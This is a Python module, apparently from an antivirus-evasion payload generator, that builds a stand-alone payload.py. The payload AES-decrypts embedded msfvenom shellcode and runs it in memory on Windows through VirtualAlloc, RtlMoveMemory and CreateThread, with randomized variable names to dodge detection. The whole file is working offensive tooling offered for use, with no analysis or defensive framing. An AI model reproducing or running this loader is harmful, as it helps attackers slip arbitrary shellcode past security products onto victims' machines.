# Based off of research done by Dave Kennedy, which has similar functionality within SET and CodeKoala which can be seen here:
# http://www.codekoala.com/blog/2009/aes-encryption-python-using-pycrypto/
# https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/core/setcore.py

# Import Modules
import base64
import random
import string
from Crypto.Cipher import AES
from modules.auxiliary import aes
from modules.auxiliary import shellcode
from modules.common import messages
from modules.common import randomizer
from modules.common import supportfiles

def pyAESVAlloc():
    # Generate Shellcode Using msfvenom
    Shellcode = shellcode.genShellcode()

    # Generate Random Variable Names
    ShellcodeVariableName = randomizer.randomString()
    RandPtr = randomizer.randomString()
    RandBuf = randomizer.randomString()
    RandHt = randomizer.randomString()
    RandDecodeAES = randomizer.randomString()
    RandCipherObject = randomizer.randomString()
    RandDecodedShellcode = randomizer.randomString()
    RandShellCode = randomizer.randomString()
    RandPadding = randomizer.randomString()

    # Set AES Block Size and Padding
    BlockSize = 32
    Padding = '{'

    # Function for Padding Encrypted Text to Fit the Block
    pad = lambda s: s + (BlockSize - len(s) % BlockSize) * Padding

    # Encrypt & Encode or Decrypt & Decode a String
    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(Padding)

    # Generate Random AES Key
    secret = aes.aesKey()

    # Create Cipher Object with Generated Secret Key
    cipher = AES.new(secret)

    # Encrypt the String
    EncodedShellcode = EncodeAES(cipher, Shellcode)

    # Create Payload File
    PayloadFile = open('payload.py', 'w')
    PayloadFile.write('#!/usr/bin/python\n\n')
    PayloadFile.write('import ctypes\n')
    PayloadFile.write('from Crypto.Cipher import AES\n')
    PayloadFile.write('import base64\n')
    PayloadFile.write('import os\n\n')
    PayloadFile.write(RandPadding + ' = \'{\'\n') 
    PayloadFile.write(RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n')
    PayloadFile.write(RandCipherObject + ' = AES.new(\'' + secret + '\')\n')
    PayloadFile.write(RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n')
    PayloadFile.write(RandShellCode + ' = bytearray(' + RandDecodedShellcode + '.decode("string_escape"))\n\n')
    PayloadFile.write(RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + RandShellCode + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n\n')
    PayloadFile.write(RandBuf + ' = (ctypes.c_char * len(' + RandShellCode + ')).from_buffer(' + RandShellCode + ')\n\n')
    PayloadFile.write('ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + RandShellCode + ')))\n\n')
    PayloadFile.write(RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n\n')
    PayloadFile.write('ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))')    
    PayloadFile.close()

    # Create Supporting Files and Print Exit Message
    supportfiles.supportingFiles()
    messages.endmsg()
